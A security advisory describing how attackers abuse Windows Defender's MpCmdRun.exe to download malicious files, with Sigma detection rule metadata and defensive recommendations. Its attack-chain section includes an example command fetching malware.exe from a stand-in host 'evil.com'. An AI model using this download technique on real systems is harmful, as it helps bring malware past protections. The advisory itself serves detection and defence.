---
title: MpCmdRun Used for Remote File Download
slug: 2024-01-03-mpcmdrun-file-download
description: Attackers are abusing the Windows Defender command-line utility, MpCmdRun.exe, to download malicious files from remote URLs, enabling them to introduce malware or offensive tooling into compromised environments.
date: "2024-01-03T14:30:00Z"
type: advisory
types:
  - advisory
severities:
  - medium
tags:
  - living-off-the-land
  - file-download
  - windows
vendors:
  - Microsoft
products:
  - Windows Defender Antivirus
mitre_ttps:
  - tactic_id: TA0011
    tactic_name: Command and Control
    technique_id: T1105
    technique_name: Ingress Tool Transfer
references:
  - https://twitter.com/mohammadaskar2/status/1301263551638761477
  - https://www.bleepingcomputer.com/news/microsoft/microsoft-defender-can-ironically-be-used-to-download-malware/
rules:
  - title: Detect Remote File Download via MpCmdRun
    description: Detects MpCmdRun.exe being used to download a remote file using the -DownloadFile, -url, and -path parameters.
    platform: sigma
    severity: medium
    tactics:
      - command_and_control
    techniques:
      - T1105
    data_sources:
      - process_creation
      - windows
  - title: Detect Remote File Download via MpCmdRun - Alternate Original Filename
    description: Detects MpCmdRun.exe being used to download a remote file by checking process.pe.original_file_name
    platform: sigma
    severity: medium
    tactics:
      - command_and_control
    techniques:
      - T1105
    data_sources:
      - process_creation
      - windows
rules_count: 2
---

Attackers are increasingly leveraging legitimate, signed utilities for malicious purposes, a tactic known as "living off the land." In this instance, adversaries are abusing the Windows Defender command-line utility, `MpCmdRun.exe`, to download files from remote URLs. This tool, normally used for managing Windows Defender Antivirus, can be misused with the `-DownloadFile`, `-url`, and `-path` parameters to retrieve and save arbitrary files. This technique allows attackers to bypass traditional download protections and introduce malware or offensive tooling into a compromised system. This activity has been observed since at least September 2020. Defenders need to be aware of the abuse potential of built-in tools like `MpCmdRun.exe` to identify and prevent such attacks.

## Attack Chain

1.  The attacker gains initial access to a Windows system (e.g., via phishing or exploiting a vulnerability).
2.  The attacker uses `MpCmdRun.exe` to download a malicious payload from a remote server using the `-DownloadFile`, `-url`, and `-path` arguments. For example: `MpCmdRun.exe -DownloadFile -url http://evil.com/malware.exe -path C:\Temp\malware.exe`.
3.  `MpCmdRun.exe` connects to the remote server hosting the malicious file via HTTP or HTTPS.
4.  The remote server responds with the malicious payload, which is downloaded and saved to the specified path.
5.  The attacker executes the downloaded payload (e.g., malware, offensive tooling) using another command execution technique, such as PowerShell or `cmd.exe`.
6.  The executed payload establishes persistence, such as creating a scheduled task or modifying registry run keys.
7.  The attacker performs lateral movement within the network, leveraging the compromised host.
8.  The attacker achieves their objective, such as data exfiltration or ransomware deployment.

## Impact

Successful exploitation enables attackers to introduce malware or offensive tools into the target environment, bypassing traditional security measures due to the use of a signed Microsoft binary. This can lead to data theft, system compromise, or ransomware deployment. While specific victim numbers and sectors are not available, the widespread use of Windows Defender makes this a potentially broad threat.

## Recommendation

*   Deploy the Sigma rule provided to detect `MpCmdRun.exe` being used to download remote files, and tune for your environment.
*   Enable Sysmon process creation logging to capture command-line arguments of processes, which is required for the provided Sigma rule.
*   Investigate any instances of `MpCmdRun.exe` executing with the `-DownloadFile`, `-url`, and `-path` arguments in your environment (reference the Sigma rule).
*   Monitor network connections initiated by `MpCmdRun.exe` to identify potentially malicious downloads (reference network connection logs).
